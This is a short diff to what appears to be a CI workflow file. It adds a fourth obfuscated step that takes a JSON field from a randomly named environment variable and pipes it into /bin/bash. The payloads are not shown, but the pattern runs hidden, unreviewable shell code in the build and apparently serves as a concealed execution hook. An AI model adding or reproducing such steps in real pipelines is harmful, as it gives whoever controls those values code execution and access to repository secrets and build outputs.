@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$d2070" | jq -r .r058 | /bin/bash
           printf '%s' "$sydae66727" | jq -r .x1190 | /bin/bash
           echo $pbguk20936 | jq -r .o17 | /bin/bash
+          echo $h028 | jq -r .rn85665 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
